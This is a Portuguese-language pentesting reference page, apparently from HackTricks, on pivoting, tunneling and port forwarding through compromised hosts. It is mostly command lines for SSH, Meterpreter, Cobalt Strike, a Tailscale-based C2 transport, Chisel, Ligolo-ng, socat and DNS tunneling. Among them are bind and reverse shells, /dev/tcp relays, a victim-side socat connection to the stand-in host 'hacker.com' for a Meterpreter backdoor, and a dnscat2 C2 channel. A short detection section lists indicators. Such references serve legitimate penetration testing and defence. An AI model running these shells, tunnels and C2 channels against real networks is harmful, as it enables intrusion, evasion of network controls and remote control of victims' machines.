# Tunneling e Port Forwarding

{{#include ../banners/hacktricks-training.md}}

## Dica do Nmap

> [!WARNING]
> O suporte a proxy do Nmap é limitado a conexões TCP e não afeta verificações de ping, portas ou detecção de sistema operacional. Quando o scanner está atrás de um proxy SOCKS, **desative a descoberta de hosts** (`-Pn`) e use uma **verificação de conexão TCP** (`-sT`).<sup>[[5]](#references)</sup>

## **Bash**

**Host -> Jump -> InternalA -> InternalB**

O comando final usa as opções `-u` e `-i` do Evil-WinRM para identificar a conta e o host WinRM; sua porta WinRM padrão é 5985.<sup>[[4]](#references)</sup>
```bash
# On the jump server connect the port 3333 to the 5985
mknod backpipe p;
nc -lvnp 5985 0<backpipe | nc -lvnp 3333 1>backpipe

# On InternalA accessible from Jump and can access InternalB
## Expose port 3333 and connect it to the winrm port of InternalB
exec 3<>/dev/tcp/internalB/5985
exec 4<>/dev/tcp/Jump/3333
cat <&3 >&4 &
cat <&4 >&3 &

# From the host, you can now access InternalB from the Jump server
evil-winrm -u username -i Jump
```
## **SSH**

O OpenSSH pode encaminhar conexões X11, portas TCP arbitrárias e sockets de domínio Unix por meio de seu canal criptografado.<sup>[[6]](#references)</sup>

Conexão gráfica SSH (X)

`-Y` habilita o encaminhamento X11 confiável e `-C` solicita compressão para os dados encaminhados.<sup>[[6]](#references)</sup>
```bash
ssh -Y -C <user>@<ip> #-Y is less secure but faster than -X
```
### Remote Port2Port

Abrir uma nova porta no SSH Server --> Outra porta

O forwarding remoto (`-R`) escuta no SSH server e se conecta ao lado local; o endereço de bind explícito controla quais interfaces podem acessar esse listener.<sup>[[6]](#references)</sup>
```bash
ssh -R 0.0.0.0:10521:127.0.0.1:1521 user@10.0.0.1 #Local port 1521 accessible in port 10521 from everywhere
```

```bash
ssh -R 0.0.0.0:10521:10.0.0.1:1521 user@10.0.0.1 #Remote port 1521 accessible in port 10521 from everywhere
```
### Port2Port

Porta local --> Host comprometido (SSH) --> Third_box:Port

O encaminhamento local (`-L`) escuta no cliente e conecta-se ao destino a partir do lado do servidor SSH.<sup>[[6]](#references)</sup>
```bash
ssh -i ssh_key <user>@<ip_compromised> -L <attacker_port>:<ip_victim>:<remote_port> [-p <ssh_port>] [-N -f]  #This way the terminal is still in your host
#Example
sudo ssh -L 631:<ip_victim>:631 -N -f -l <username> <ip_compromised>
```
### Port2hostnet (proxychains)

Porta local --> Host comprometido (SSH) --> Qualquer lugar

O encaminhamento dinâmico (`-D`) cria um listener SOCKS4/SOCKS5 local cujas conexões são abertas a partir do lado remoto.<sup>[[6]](#references)</sup>
```bash
ssh -f -N -D <attacker_port> <username>@<ip_compromised> #All sent to local port will exit through the compromised server (use as proxy)
```
### Multi-hop com ProxyJump

`-J`/`ProxyJump` conecta-se ao alvo por meio de um ou mais jump hosts separados por vírgulas. As opções de forwarding ainda pertencem à conexão SSH final, portanto o listener SOCKS abaixo acessa destinos a partir de `internal-target`, não do primeiro bastion. Isso evita fazer login em um jump host e iniciar um segundo cliente SSH nele.<sup>[[6]](#references)</sup>
```bash
# Reach the final SSH server through two bastions
ssh -J user1@jump1:22,user2@jump2:22 user3@internal-target

# Create a local SOCKS proxy whose connections exit from internal-target
ssh -J user1@jump1,user2@jump2 -N -D 127.0.0.1:1080 user3@internal-target
```
As opções específicas do host para jump machines devem ser colocadas em `~/.ssh/config`; a configuração de linha de comando destinada ao destino não é aplicada automaticamente aos hosts intermediários.<sup>[[6]](#references)</sup>

### Reverse Port Forwarding

Isso é útil para obter reverse shells de hosts internos por meio de uma DMZ até o seu host:

A configuração `GatewayPorts` do servidor controla se um remote forward pode fazer bind além do loopback; o valor padrão é `no`.<sup>[[7]](#references)</sup>
```bash
ssh -i dmz_key -R <dmz_internal_ip>:443:0.0.0.0:7000 root@10.129.203.111 -vN
# Now you can send a rev to dmz_internal_ip:443 and capture it in localhost:7000
# Note that port 443 must be open
# Also, remmeber to edit the /etc/ssh/sshd_config file on Ubuntu systems
# and change the line "GatewayPorts no" to "GatewayPorts yes"
# to be able to make ssh listen in non internal interfaces in the victim (443 in this case)
```
### VPN-Tunnel

Este exemplo baseado em root cria dispositivos de túnel em ambos os hosts. O servidor deve permitir o encaminhamento tun, e a conta selecionada deve ter acesso ao dispositivo tun; `PermitRootLogin yes` é uma forma de usar a conta `root` aqui.<sup>[[6]](#references)[[7]](#references)</sup>\
`PermitRootLogin yes`\
`PermitTunnel yes`
```bash
ssh root@server -w any:any #This will create Tun interfaces in both devices
ip addr add 1.1.1.2/32 peer 1.1.1.1 dev tun0 #Client side VPN IP
ip link set tun0 up #Activate the client side network interface
ip addr add 1.1.1.1/32 peer 1.1.1.2 dev tun0 #Server side VPN IP
ip link set tun0 up #Activate the server side network interface
```
Ativar o forwarding no lado do servidor
```bash
echo 1 > /proc/sys/net/ipv4/ip_forward
iptables -t nat -A POSTROUTING -s 1.1.1.2 -o eth0 -j MASQUERADE
```
Defina uma nova rota no lado do cliente
```
route add -net 10.0.0.0/16 gw 1.1.1.1
```
> [!NOTE]
> **Segurança – Terrapin Attack (CVE-2023-48795)**
> O OpenSSH 9.6 adicionou uma extensão strict-KEX para combater o ataque de integridade do early-transport do Terrapin. Atualize ambos os peers quando possível e siga as orientações do fornecedor para implementações mais antigas, em vez de presumir que um canal encaminhado está protegido apenas pela versão.<sup>[[8]](#references)</sup>

## SSHUTTLE

Você pode fazer **tunnel** via **ssh** de todo o **traffic** para uma **subnetwork** através de um host.\
Por exemplo, encaminhar todo o traffic destinado a 10.10.10.0/24

`sshuttle` fornece proxying transparente sobre SSH e permite selecionar subnetworks e um comando SSH personalizado, conforme mostrado abaixo.<sup>[[9]](#references)</sup>
```bash
pip install sshuttle
sshuttle -r user@host 10.10.10.10/24
```
Conecte-se com uma chave privada
```bash
sshuttle -D -r user@host 10.10.10.10 0/0 --ssh-cmd 'ssh -i ./id_rsa'
# -D : Daemon mode
```
## Meterpreter

O `portfwd` do Metasploit oferece encaminhamento local e remoto, enquanto o módulo de proxy SOCKS foi projetado para funcionar com rotas de sessão ou `autoroute` e, por padrão, escuta na porta 1080 nestes exemplos.<sup>[[10]](#references)[[11]](#references)[[12]](#references)</sup>

### Port2Port

Porta local --> Host comprometido (sessão ativa) --> Third_box:Porta
```bash
# Inside a meterpreter session
portfwd add -l <attacker_port> -p <Remote_port> -r <Remote_host>
```
### SOCKS
```bash
background# meterpreter session
route add <IP_victim> <Netmask> <Session> # (ex: route add 10.10.10.14 255.255.255.0 8)
use auxiliary/server/socks_proxy
run #Proxy port 1080 by default
echo "socks4 127.0.0.1 1080" > /etc/proxychains.conf #Proxychains
```
Outra forma:
```bash
background #meterpreter session
use post/multi/manage/autoroute
set SESSION <session_n>
set SUBNET <New_net_ip> #Ex: set SUBNET 10.1.13.0
set NETMASK <Netmask>
run
use auxiliary/server/socks_proxy
set VERSION 4a
run #Proxy port 1080 by default
echo "socks4 127.0.0.1 1080" > /etc/proxychains.conf #Proxychains
```
## Cobalt Strike

O Beacon do Cobalt Strike pode retransmitir conexões SOCKS4a/SOCKS5 por meio de um Beacon; `rportfwd` faz o bind em um host comprometido, enquanto `rportfwd_local` inicia a conexão com o destino a partir do cliente do Cobalt Strike.<sup>[[13]](#references)[[14]](#references)</sup>

### SOCKS proxy

Abra uma porta no Team Server nas interfaces que devem rotear o tráfego por meio do Beacon.<sup>[[13]](#references)</sup>
```bash
beacon> socks 1080
[+] started SOCKS4a server on: 1080

# Set port 1080 as proxy server in proxychains.conf
proxychains nmap -n -Pn -sT -p445,3389,5985 10.10.17.25
```
### rPort2Port

> [!WARNING]
> Neste caso, a **porta é aberta no host do Beacon**, não no Team Server, e o tráfego é enviado ao Team Server e, de lá, para o host:porta indicado.<sup>[[14]](#references)</sup>
```bash
rportfwd [bind port] [forward host] [forward port]
rportfwd stop [bind port]
```
O manual de reverse-forwarding observa o seguinte comportamento:<sup>[[14]](#references)</sup>

- O reverse port forward do Beacon foi projetado para **tunelar tráfego até o Team Server, não para retransmitir tráfego entre máquinas individuais**.
- O tráfego é **tunelado dentro do tráfego C2 do Beacon**, incluindo links P2P.
- Portas altas geralmente evitam restrições de portas privilegiadas, mas a política do sistema operacional de destino e os listeners existentes ainda se aplicam.

### rPort2Port local

> [!WARNING]
> Nesse caso, a **porta é aberta no host do Beacon**, não no Team Server, e o **tráfego é enviado ao cliente do Cobalt Strike** (não ao Team Server) e, a partir dele, ao host:porta indicado.<sup>[[14]](#references)</sup>
```bash
rportfwd_local [bind port] [forward host] [forward port]
rportfwd_local stop [bind port]
```
## BOFScale - tailnet em processo com CDN na frente

[BOFScale](https://github.com/NetSPI/BOFscale) executa um overlay Tailscale modificado dentro de um implante C2 do Windows sem instalar um driver TUN ou um serviço. Seus três componentes são um BOF-PE `tailscaled` assíncrono `c-shared` em CGo, um pequeno BOF-PE em C++ que se comunica com a API local e uma ponte TCP-para-SOCKS5 assíncrona `socksportfwd`.<sup>[[53]](#references)[[54]](#references)</sup>

### TS2021 e DERP compatíveis com CDN

O Tailscale normalmente usa upgrades HTTP proprietários para o canal de controle TS2021 baseado em Noise e para o relay DERP. O BOFScale mantém esses byte streams, mas os transporta em WebSockets RFC 6455, usando `Sec-WebSocket-Protocol: ts2021` ou `derp`, permitindo que uma origem Headscale/DERP controlada pelo operador fique atrás de uma CDN que aceita apenas upgrades WebSocket padrão. O cliente modificado tenta novamente o TS2021 sobre WebSockets após um HTTP `500`, tenta novamente o DERP após um HTTP `426` e faz o dialer WebSocket do DERP respeitar a configuração de proxy do host; o BOF define `TS_DEBUG_DERP_WS_CLIENT=1` para ignorar a primeira tentativa conhecida por falhar.<sup>[[53]](#references)[[54]](#references)</sup>

A CDN e o proxy de origem devem preservar os upgrades WebSocket para `/ts2021` e `/derp`, encaminhar `/key` como HTTP comum e desativar os read/write timeouts internos, pois as sessões de relay podem permanecer abertas indefinidamente. A configuração fornecida do Headscale habilita `verify_clients`, publica apenas o mapa DERP incorporado do operador e deixa `derp.urls` vazio para impedir o fallback para relays operados pelo Tailscale.<sup>[[53]](#references)[[54]](#references)</sup>

### Daemon em processo e controle por named pipe

Salvo quando substituído, o ponto de entrada do BOF inicia o `tailscaled` com `-tun=userspace-networking`, `-state mem:` e `-no-logs-no-support`, e então cria um pipe nomeado com nome baseado em UUID. Ele redireciona o stdout/stderr do Go por meio de um pipe do sistema operacional para a API de saída do Beacon, mantendo o daemon completo e o runtime do Go residentes, mas sem gravar estado e logs em um diretório do Tailscale.<sup>[[53]](#references)[[54]](#references)</sup>

O cliente leve reproduz a API local HTTP/1.0 do Tailscale por meio desse pipe. Ele abre o pipe com `SECURITY_SQOS_PRESENT | SECURITY_IMPERSONATION` porque a camada `safesocket` do daemon personifica o cliente do pipe, envia `Tailscale-Cap: 125` e mapeia a API local para as operações `up`, `down`, `status`, anúncio de rotas e desligamento.<sup>[[53]](#references)[[54]](#references)</sup>

> [!WARNING]
> Não descarregue um BOF-PE Go mapeado manualmente após solicitar o desligamento do daemon: as goroutines do runtime e do garbage collector podem continuar executando a partir de uma memória que o loader descarrega. Execute o `tailscaled` em um processo descartável e encerre esse processo para a limpeza final.<sup>[[54]](#references)</sup>

### Encaminhar tráfego originado no host por meio do SOCKS5 em userspace

As conexões de entrada do tailnet e as rotas de sub-rede anunciadas funcionam dentro da network stack em userspace, mas os processos normais no host comprometido não têm uma rota do sistema operacional para o overlay. Por isso, o `socksportfwd` escuta em uma porta TCP voltada para a vítima, negocia SOCKS5 `NO AUTH` com o listener `0.0.0.0:1080` do daemon, emite `CONNECT` para um destino do tailnet e retransmite os dados nas duas direções de forma assíncrona. Quando o destino é um nome MagicDNS, ele usa `ATYP_DOMAIN`, fazendo com que o `tailscaled` resolva o nome sem expô-lo ao resolver do Windows.<sup>[[53]](#references)[[54]](#references)</sup>

Um fluxo mínimo do operador é mostrado abaixo; tanto o nó do operador quanto o implante devem usar os binários modificados, pois o Tailscale original não consegue atravessar este design de CDN.<sup>[[53]](#references)[[54]](#references)</sup>
```bash
HEADSCALE_HOSTNAME=<cdn-hostname> docker compose up
# Start tailscaled as an asynchronous BOF and copy its printed pipe name
tailscaled
tailscale --socket '\\.\pipe\<uuid>' up --auth-key <key> --login-server https://<cdn-hostname>
tailscale --socket '\\.\pipe\<uuid>' set --advertise-routes <victim-cidr>
socksportfwd --t <operator-magicdns-name> --tp 8888 --p 8888
```
O forward local pode separar o listener de autenticação aparente da ferramenta de relay: force uma máquina a se autenticar na porta vinculada do host comprometido, encaminhe isso pela tailnet até o `ntlmrelayx` e faça o relay posteriormente para AD CS, LDAP, HTTP, SMB ou outro alvo compatível. Consulte [WebDAV NTLM coercion](../windows-hardening/ntlm/places-to-steal-ntlm-creds.md#webdav-auth-coercion--credential-validation-via-davclntdlldavsetcookie) e [ESC8 relay to AD CS](../windows-hardening/active-directory-methodology/ad-certificates/domain-escalation.md#ntlm-relay-to-ad-cs-http-endpoints--esc8) para as etapas específicas da vulnerabilidade; o BOFScale é apenas o transporte.<sup>[[54]](#references)</sup>

### Detecção

Procure a combinação, em vez de um único indicador fraco: um runtime Go em um processo que normalmente não é baseado em Go, um pipe UUID com SDDL permissivo `D:(A;;GA;;;WD)`, um listener SOCKS inesperado em `0.0.0.0:1080` e WebSockets TLS de longa duração para endereços de CDN. Com inspeção TLS, sinalize `Sec-WebSocket-Protocol: derp` ou `ts2021` quando o processo proprietário não for um serviço `tailscaled` autorizado. As regras `bofscale.yar` do repositório fornecem assinaturas de memória para os três componentes BOF-PE.<sup>[[53]](#references)[[54]](#references)</sup>

## reGeorg

[https://github.com/sensepost/reGeorg](https://github.com/sensepost/reGeorg)

O projeto fornece endpoints de web tunnel, como `tunnel.aspx`, `tunnel.ashx`, `tunnel.jsp` e `tunnel.php`; faça o upload de um endpoint compatível antes de iniciar o proxy local.<sup>[[15]](#references)</sup>
```bash
python reGeorgSocksProxy.py -p 8080 -u http://upload.sensepost.net:8080/tunnel/tunnel.jsp
```
## Chisel

Você pode baixá-lo na página de releases de [https://github.com/jpillora/chisel](https://github.com/jpillora/chisel)\
O Chisel transporta tráfego TCP/UDP por HTTP usando uma conexão protegida por SSH; use builds compatíveis de cliente/servidor e verifique a sintaxe de comandos da release selecionada.<sup>[[16]](#references)</sup>

### socks
```bash
./chisel server -p 8080 --reverse #Server -- Attacker
./chisel-x64.exe client 10.10.14.3:8080 R:socks #Client -- Victim
#And now you can use proxychains with port 1080 (default)

./chisel server -v -p 8080 --socks5 #Server -- Victim (needs to have port 8080 exposed)
./chisel client -v 10.10.10.10:8080 socks #Attacker
```
### Port forwarding
```bash
./chisel_1.7.6_linux_amd64 server -p 12312 --reverse #Server -- Attacker
./chisel_1.7.6_linux_amd64 client 10.10.14.20:12312 R:4505:127.0.0.1:4505 #Client -- Victim
```
## wstunnel

[`wstunnel`](https://github.com/erebe/wstunnel) transporta encaminhamentos estáticos ou dinâmicos por WebSocket, HTTP/2 ou WebTransport (HTTP/3 sobre QUIC). As versões atuais oferecem suporte a TCP, UDP, sockets Unix, stdio, SOCKS5, proxy HTTP e listeners de transparent-proxy do Linux, tanto no modo forward quanto no reverse.<sup>[[52]](#references)</sup>

### Pivot SOCKS5 reverso

Execute o server no atacante e faça o pivot conectar-se de saída usando `-R`. Nessa direção, o listener SOCKS5 é criado no **server**, enquanto as conexões solicitadas se originam na rede do **client/pivot**.<sup>[[52]](#references)</sup>
```bash
# Attacker: use a certificate valid for pivot.example
wstunnel server --tls-certificate cert.pem --tls-private-key key.pem wss://0.0.0.0:443

# Pivot: expose an attacker-side, loopback-only SOCKS5 listener
wstunnel client --tls-verify-certificate \
-R 'socks5://127.0.0.1:1080' wss://pivot.example:443

# Attacker
proxychains nmap -n -Pn -sT -p 445,3389 10.10.10.0/24
```
Um reverse static forward usa a mesma direção. Por exemplo, o seguinte expõe `10.10.10.20:445`, conforme alcançado pelo pivot, na porta de loopback `8445` do atacante:<sup>[[52]](#references)</sup>
```bash
wstunnel client --tls-verify-certificate \
-R 'tcp://127.0.0.1:8445:10.10.10.20:445' wss://pivot.example:443
```
### Egress e detalhes de transporte

- Adicione `-p http://user:pass@proxy:8080` ao cliente para atravessar um proxy HTTP explícito. Use `socks5h://127.0.0.1:1080` em clientes como `curl` (ou habilite o DNS via proxy na aplicação) para que os nomes internos sejam resolvidos além do túnel, em vez de vazarem para o resolvedor local.<sup>[[52]](#references)</sup>
- `wss://` seleciona WebSocket protegido por TLS. Um cliente `https://` seleciona HTTP/2, mas o buffering ou a conversão para HTTP/1 por reverse proxies/CDNs frequentemente interrompe o stream bidirecional; exponha o servidor wstunnel diretamente ao testar esse modo.<sup>[[52]](#references)</sup>
- `wts://` seleciona WebTransport sobre QUIC. Inicie o servidor com `--enable-webtransport` (ou uma URL de escuta `wts://`) e permita UDP na porta de escuta. Esse modo não pode atravessar um proxy HTTP `CONNECT` convencional porque esse proxy transporta TCP.<sup>[[52]](#references)</sup>

> [!WARNING]
> O projeto upstream alerta para não tratar seu certificado autoassinado incorporado como proteção de privacidade. Prefira um certificado personalizado válido junto com `--tls-verify-certificate` (ou mTLS), mantenha os listeners de proxy no loopback, a menos que o acesso remoto seja intencional, e faça tunneling de protocolos já seguros quando a confidencialidade for importante.<sup>[[52]](#references)</sup>

## Ligolo-ng

[https://github.com/nicocha30/ligolo-ng](https://github.com/nicocha30/ligolo-ng)

O quickstart do Ligolo-ng documenta uma interface TUN no proxy, a validação da impressão digital do certificado do agent e a configuração de rotas para a rede submetida ao túnel.<sup>[[17]](#references)</sup>

### Tunneling
```bash
# Start proxy server and automatically generate self-signed TLS certificates -- Attacker
sudo ./proxy -selfcert
# Create an interface named "ligolo" -- Attacker
interface_create --name "ligolo"
# Print the currently used certificate fingerprint -- Attacker
certificate_fingerprint
# Start the agent with certification validation -- Victim
./agent -connect <ip_proxy>:11601 -v -accept-fingerprint <fingerprint>
# Select the agent -- Attacker
session
1
# Start the tunnel on the proxy server -- Attacker
tunnel_start --tun "ligolo"
# Display the agent's network configuration -- Attacker
ifconfig
# Create a route to the agent's specified network -- Attacker
interface_add_route --name "ligolo" --route <network_address_agent>/<netmask_agent>
# Display the tun interfaces -- Attacker
interface_list
```
### Vinculação e escuta do Agent

O Ligolo-ng pode adicionar listeners no agent que encaminham para um endereço no proxy, e seu intervalo reservado `240.0.0.0/4` pode ser roteado para alcançar serviços locais do agent.<sup>[[18]](#references)[[19]](#references)</sup>
```bash
# Establish a tunnel from the proxy server to the agent
# Create a TCP listening socket on the agent (0.0.0.0) on port 30000 and forward incoming TCP connections to the proxy (127.0.0.1) on port 10000 -- Attacker
listener_add --addr 0.0.0.0:30000 --to 127.0.0.1:10000 --tcp
# Display the currently running listeners on the agent -- Attacker
listener_list
```
### Acessar as portas locais do Agent
```bash
# Establish a tunnel from the proxy server to the agent
# Create a route to redirect traffic for 240.0.0.1 to the Ligolo-ng interface to access the agent's local services -- Attacker
interface_add_route --name "ligolo" --route 240.0.0.1/32
```
## Rpivot

[https://github.com/klsecservices/rpivot](https://github.com/klsecservices/rpivot)

O Rpivot inicia o túnel reverso a partir da vítima e expõe um proxy SOCKS4 no endereço de loopback do atacante; seu README também documenta credenciais de proxy NTLM e opções de hash.<sup>[[20]](#references)</sup>
```bash
attacker> python server.py --server-port 9999 --server-ip 0.0.0.0 --proxy-ip 127.0.0.1 --proxy-port 1080
```

```bash
victim> python client.py --server-ip <rpivot_server_ip> --server-port 9999
```
Pivot através de **NTLM proxy**
```bash
victim> python client.py --server-ip <rpivot_server_ip> --server-port 9999 --ntlm-proxy-ip <proxy_ip> --ntlm-proxy-port 8080 --domain CONTOSO.COM --username Alice --password P@ssw0rd
```

```bash
victim> python client.py --server-ip <rpivot_server_ip> --server-port 9999 --ntlm-proxy-ip <proxy_ip> --ntlm-proxy-port 8080 --domain CONTOSO.COM --username Alice --hashes 9b9850751be2515c8231e5189015bbe6:49ef7638d69a01f26d96ed673bf50c45
```
## **Socat**

[https://github.com/andrew-d/static-binaries](https://github.com/andrew-d/static-binaries)

O Socat combina tipos de endereço como `TCP-LISTEN`, `EXEC`, `SOCKS4A`, `OPENSSL` e `PROXY`; os exemplos abaixo combinam esses endpoints documentados.<sup>[[21]](#references)</sup>

### Bind shell
```bash
victim> socat TCP-LISTEN:1337,reuseaddr,fork EXEC:bash,pty,stderr,setsid,sigint,sane
attacker> socat FILE:`tty`,raw,echo=0 TCP4:<victim_ip>:1337
```
### Reverse shell
```bash
attacker> socat TCP-LISTEN:1337,reuseaddr FILE:`tty`,raw,echo=0
victim> socat TCP4:<attackers_ip>:1337 EXEC:bash,pty,stderr,setsid,sigint,sane
```
### Port2Port
```bash
socat TCP4-LISTEN:<lport>,fork TCP4:<redirect_ip>:<rport> &
```
### Port2Port através de socks
```bash
socat TCP4-LISTEN:1234,fork SOCKS4A:127.0.0.1:google.com:80,socksport=5678
```
### Meterpreter através de SSL Socat
```bash
#Create meterpreter backdoor to port 3333 and start msfconsole listener in that port
attacker> socat OPENSSL-LISTEN:443,cert=server.pem,cafile=client.crt,reuseaddr,fork,verify=1 TCP:127.0.0.1:3333
```

```bash
victim> socat.exe TCP-LISTEN:2222 OPENSSL,verify=1,cert=client.pem,cafile=server.crt,connect-timeout=5|TCP:hacker.com:443,connect-timeout=5
#Execute the meterpreter
```
Você pode atravessar um **proxy não autenticado** com o tipo de endereço `PROXY` documentado do socat, executando esta linha em vez da última no console da vítima.<sup>[[21]](#references)</sup>
```bash
OPENSSL,verify=1,cert=client.pem,cafile=server.crt,connect-timeout=5|PROXY:hacker.com:443,connect-timeout=5|TCP:proxy.lan:8080,connect-timeout=5
```
[https://funoverip.net/2011/01/reverse-ssl-backdoor-with-socat-and-metasploit/](https://funoverip.net/2011/01/reverse-ssl-backdoor-with-socat-and-metasploit/)

### Túnel SSL Socat

**/bin/sh console**

Crie certificados em ambos os lados: Client e Server
```bash
# Execute these commands on both sides
FILENAME=socatssl
openssl genrsa -out $FILENAME.key 1024
openssl req -new -key $FILENAME.key -x509 -days 3653 -out $FILENAME.crt
cat $FILENAME.key $FILENAME.crt >$FILENAME.pem
chmod 600 $FILENAME.key $FILENAME.pem
```

```bash
attacker-listener> socat OPENSSL-LISTEN:433,reuseaddr,cert=server.pem,cafile=client.crt EXEC:/bin/sh
victim> socat STDIO OPENSSL-CONNECT:localhost:433,cert=client.pem,cafile=server.crt
```
### Remote Port2Port

Conecte a porta SSH local (22) à porta 443 do host do atacante
```bash
attacker> sudo socat TCP4-LISTEN:443,reuseaddr,fork TCP4-LISTEN:2222,reuseaddr #Redirect port 2222 to port 443 in localhost
victim> while true; do socat TCP4:<attacker>:443 TCP4:127.0.0.1:22 ; done # Establish connection with the port 443 of the attacker and everything that comes from here is redirected to port 22
attacker> ssh localhost -p 2222 -l www-data -i vulnerable #Connects to the ssh of the victim
```
## Plink.exe

Plink é a ferramenta de conexão de linha de comando do PuTTY, com opções de encaminhamento SSH semelhantes às do `ssh`.<sup>[[22]](#references)</sup>

Use `-P` em maiúscula para a porta SSH. `-pw` é mantido por compatibilidade, mas expõe a senha na lista de processos; prefira autenticação por chave ou `-pwfile` quando possível.<sup>[[22]](#references)[[23]](#references)</sup>

Como esse binário será executado na vítima e é um cliente SSH, abra o serviço e a porta SSH para a conexão reversa; o exemplo a seguir usa `-R` para encaminhar uma porta acessível localmente para a máquina do atacante.<sup>[[22]](#references)</sup>
```bash
echo y | plink.exe -l <Our_valid_username> -pw <valid_password> [-P <port>] -R <port_ in_our_host>:<next_ip>:<final_port> <your_ip>
echo y | plink.exe -l root -pw password [-P 2222] -R 9090:127.0.0.1:9090 10.11.0.41 #Local port 9090 to out port 9090
```
## Windows netsh

### Port2Port

Use um contexto com as permissões exigidas pelo host ao criar ou alterar regras persistentes de `portproxy`. A Microsoft documenta os formatos `v4tov4` de adição, exibição e exclusão usados abaixo.<sup>[[24]](#references)</sup>
```bash
netsh interface portproxy add v4tov4 listenaddress= listenport= connectaddress= connectport= protocol=tcp
# Example:
netsh interface portproxy add v4tov4 listenaddress=0.0.0.0 listenport=4444 connectaddress=10.10.10.10 connectport=4444
# Check the port forward was created:
netsh interface portproxy show v4tov4
# Delete port forward
netsh interface portproxy delete v4tov4 listenaddress=0.0.0.0 listenport=4444
```
## SocksOverRDP & Proxifier

Você precisa ter **acesso RDP ao sistema**.\
Baixe:

SocksOverRDP usa Remote Desktop Dynamic Virtual Channels para transportar uma conexão SOCKS5 por uma sessão RDP existente; o plugin do cliente escuta em `127.0.0.1:1080`, enquanto o componente do servidor é executado no destino RDP.<sup>[[25]](#references)</sup>

1. [Binários x64 do SocksOverRDP](https://github.com/nccgroup/SocksOverRDP/releases) - Esta ferramenta usa `Dynamic Virtual Channels` (`DVC`) do recurso Remote Desktop Service do Windows. O DVC é responsável por **tunelar pacotes pela conexão RDP**.
2. [Binário portátil do Proxifier](https://www.proxifier.com/download/#win-tab)

No computador cliente, carregue **`SocksOverRDP-Plugin.dll`** desta forma:
```bash
# Load SocksOverRDP.dll using regsvr32.exe
C:\SocksOverRDP-x64> regsvr32.exe SocksOverRDP-Plugin.dll
```
Agora podemos **nos conectar** à **vítima** via **RDP** usando o **`mstsc.exe`**, e devemos receber um **prompt** informando que o **plugin SocksOverRDP** está habilitado e que ele ficará **escutando** em **127.0.0.1:1080**.

**Conecte-se** via **RDP** e envie e execute na máquina vítima o binário `SocksOverRDP-Server.exe`:
```
C:\SocksOverRDP-x64> SocksOverRDP-Server.exe
```
Agora, confirme em sua máquina (atacante) que a porta 1080 está em escuta:
```
netstat -antb | findstr 1080
```
Agora você pode usar o [**Proxifier**](https://www.proxifier.com/) para fazer o tráfego passar por esse port.<sup>[[26]](#references)</sup>

## Proxify aplicações GUI do Windows

Você pode fazer com que aplicações GUI do Windows naveguem através de um proxy usando o [**Proxifier**](https://www.proxifier.com/).<sup>[[26]](#references)</sup>\
Em **Profile -> Proxy Servers**, adicione o IP e a porta do servidor SOCKS.\
Em **Profile -> Proxification Rules**, adicione o nome do programa a ser proxificado e as conexões aos IPs que deseja proxificar; as regras do Proxifier podem corresponder a aplicações, hosts de destino e portas.<sup>[[27]](#references)</sup>

## Tunelar através de um proxy NTLM

A ferramenta mencionada anteriormente, **Rpivot**, pode retransmitir através de um proxy que autentica com NTLM. O **OpenVPN** também pode rotear através de um quando configurado com um arquivo de autenticação e o método NTLMv2; isso é travessia de proxy, não um bypass da autenticação do proxy.<sup>[[20]](#references)[[28]](#references)</sup>
```bash
http-proxy <proxy_ip> 8080 <file_with_creds> ntlm2
```
### Cntlm

[http://cntlm.sourceforge.net/](http://cntlm.sourceforge.net/)

Cntlm autentica-se em proxies NTLM upstream, expõe listeners locais e pode mapear uma porta de túnel local para um serviço de destino; os clientes podem então usar essa porta local.<sup>[[29]](#references)</sup>\
Por exemplo, encaminhar a porta 443
```
Username Alice
Password P@ssw0rd
Domain CONTOSO.COM
Proxy 10.0.0.10:8080
Tunnel 2222:<attackers_machine>:443
```
Agora, se você configurar, por exemplo, o serviço **SSH** na vítima para escutar na porta 443, poderá conectar-se a ele por meio da porta 2222 do atacante.<sup>[[29]](#references)</sup>\
Você também poderia usar um **meterpreter** que se conecta a localhost:443 enquanto o atacante escuta na porta 2222.<sup>[[29]](#references)</sup>

## YARP

YARP (Yet Another Reverse Proxy) é o toolkit de reverse proxy .NET da Microsoft. Você pode encontrá-lo aqui: [https://github.com/microsoft/reverse-proxy](https://github.com/microsoft/reverse-proxy).<sup>[[30]](#references)</sup>

## DNS Tunneling

### Iodine

[https://code.kryo.se/iodine/](https://code.kryo.se/iodine/)

O Iodine cria um túnel IPv4 por meio de consultas DNS e usa interfaces TUN; a configuração documentada exige os privilégios necessários para criar essas interfaces em ambas as extremidades.<sup>[[31]](#references)</sup>
```
attacker> iodined -f -c -P P@ssw0rd 1.1.1.1 tunneldomain.com
victim> iodine -f -P P@ssw0rd tunneldomain.com -r
#You can see the victim at 1.1.1.2
```
O transporte DNS tem um overhead maior que o TCP direto e normalmente é lento; você pode criar uma conexão SSH comprimida por meio desse túnel usando:<sup>[[31]](#references)</sup>
```
ssh <user>@1.1.1.2 -C -c blowfish-cbc,arcfour -o CompressionLevel=9 -D 1080
```
### DNSCat2

[**Baixe-o aqui**](https://github.com/iagox86/dnscat2)**.**

O Dnscat2 estabelece um canal de command-and-control criptografado por meio de DNS; os comandos do server e do client abaixo seguem seu uso documentado.<sup>[[32]](#references)</sup>
```bash
attacker> ruby ./dnscat2.rb tunneldomain.com
victim> ./dnscat2 tunneldomain.com

# If using it in an internal network for a CTF:
attacker> ruby dnscat2.rb --dns host=10.10.10.10,port=53,domain=mydomain.local --no-cache
victim> ./dnscat2 --dns host=10.10.10.10,port=5353
```
#### **In PowerShell**

Você pode usar [**dnscat2-powershell**](https://github.com/lukebaggett/dnscat2-powershell) para executar um cliente dnscat2 no PowerShell; o README documenta os parâmetros de `Start-Dnscat2` mostrados abaixo.<sup>[[33]](#references)</sup>
```
Import-Module .\dnscat2.ps1
Start-Dnscat2 -DNSserver 10.10.10.10 -Domain mydomain.local -PreSharedSecret somesecret -Exec cmd
```
#### **Port forwarding com dnscat**

O comando interativo `listen` do Dnscat2 mapeia um listener local para um host e uma porta remotos.<sup>[[32]](#references)</sup>
```bash
session -i <sessions_id>
listen [lhost:]lport rhost:rport #Ex: listen 127.0.0.1:8080 10.0.0.20:80, this bind 8080port in attacker host
```
#### Alterar o DNS do proxychains

